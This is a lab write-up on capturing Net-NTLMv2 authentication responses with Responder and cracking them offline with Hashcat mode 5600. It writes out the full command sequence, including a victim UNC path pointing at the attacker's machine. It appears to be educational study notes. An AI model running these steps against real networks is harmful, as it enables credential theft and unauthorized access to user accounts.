# Capturing Net-NTLMv2 Hash

**Net-NTLMv2** is an authentication response generated when Windows performs NTLM authentication over the network. In certain scenarios, a low-privileged user can be tricked into authenticating to an attacker-controlled machine, allowing the attacker to capture the Net-NTLMv2 response and attempt to crack the associated password offline.

---

## Lab

### Step 1: Start Responder

First, we start **Responder** on the attacking machine to listen for authentication attempts on the VPN interface.

```
sudo responder -I tun0
```

The `-I tun0` option tells Responder to listen on the `tun0` network interface.

In this lab, `tun0` is the interface used to communicate with the target machine through the VPN.

![](../../../../Images/Pasted%20image%2020260927001106.png)

### Step 2: Trigger NTLM Authentication

Next, from the victim machine, we access a network resource using a UNC path pointing to the attacker's IP address.

```
dir \\192.168.141.147\test
```

The important part is:

```
\\192.168.141.147\test
```

This tells Windows to access the `test` network share on the machine at `192.168.141.147`.

When Windows attempts to access the remote resource, it may attempt to authenticate to the remote machine using **NTLM**.

Because Responder is listening on the attacker's machine, it can capture this authentication attempt.

![](../../../../Images/Pasted%20image%2020260927001345.png)

### Step 3: Capture the Net-NTLMv2 Response

After the victim attempts to access the network resource, Responder captures the NTLM authentication exchange.

The captured data contains a **Net-NTLMv2 response** associated with the authenticated Windows user.

![](../../../../Images/Pasted%20image%2020260927001445.png)

It is important to understand that this is **not the user's plaintext password**.

Instead, Windows generates a challenge-response value based on information derived from the user's credentials and the NTLM authentication process.

The captured response can then be used for an **offline password-cracking attempt**.

### Step 4: Save the Captured Hash

We copy the complete Net-NTLMv2 response provided by Responder and save it to a file.

For example:

```
hash
```

The captured value must be copied exactly because Hashcat expects the Net-NTLMv2 data to follow a specific format.

A typical Net-NTLMv2 entry has a structure similar to:

```
USERNAME::DOMAIN:CHALLENGE:NT_PROOF_STR:BLOB
```

### Step 5: Crack the Net-NTLMv2 Response

We can use **Hashcat** to attempt to recover the password from the captured Net-NTLMv2 response.

For Net-NTLMv2, Hashcat uses **mode `5600`**.

```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

Where:

```
-m 5600
```

Specifies the **Net-NTLMv2** hash mode.

```
hash
```

Contains the captured Net-NTLMv2 response.

```
/usr/share/wordlists/rockyou.txt
```

Is the password wordlist used for the cracking attempt.

Hashcat tries candidate passwords from the wordlist and checks whether they produce the same response as the captured Net-NTLMv2 authentication data.

![](../../../../Images/Pasted%20image%2020260927001740.png)

# Attack Flow

```
Start Responder
       ↓
Listen on tun0
       ↓
Victim accesses \\ATTACKER_IP\test
       ↓
Windows attempts NTLM Authentication
       ↓
Responder captures Net-NTLMv2
       ↓
Save the captured response
       ↓
Hashcat -m 5600
       ↓
Offline password cracking
       ↓
Recover password if it is successfully cracked
```

# Key Takeaway

The important concept is that we are **not directly stealing the Windows password**.

Instead, the process is:

> **Trigger NTLM Authentication → Capture the Net-NTLMv2 response → Perform offline password cracking.**

The technique relies on the victim being induced to authenticate to an attacker-controlled system and on the captured response being crackable with the available password candidates.